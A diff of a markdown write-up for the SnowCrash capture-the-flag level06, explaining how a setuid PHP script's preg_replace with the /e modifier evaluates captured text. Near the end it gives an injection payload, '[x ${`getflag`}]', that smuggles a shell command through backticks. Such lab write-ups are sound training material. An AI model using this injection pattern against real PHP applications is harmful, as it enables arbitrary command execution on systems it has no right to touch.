@@ -1,3 +1,6 @@
+# Privilege escalation via PHP code injection
+
+```
 $ ls -la
 total 24
 dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
@@ -7,8 +10,11 @@ d--x--x--x  1 root    users    340 Aug 30  2015 ..
 -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
 -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
 -r-x------  1 level06 level06  675 Apr  3  2012 .profile
-
+```
+```
 level06@SnowCrash:~$ cat level06.php 
+```
+```
 #!/usr/bin/php
 <?php
 
@@ -41,9 +47,11 @@ print $r; // Print the result
 
 ?>
 
+```
+
 if we focus on the line 
 
-$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+```$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); ```
 
 
 (\[x (.*)\])/e  captures [x <something>]
@@ -53,6 +61,7 @@ and the /e tells use to replace the match text with the result of calling the fu
 but we wont pass the whole captured text
 we will only send the part that matches the second capturing group of the match text because of \2
 
+### Exploiting vulnerabilities
 
 echo '[x ${`getflag`}]' > /tmp/flag06
 
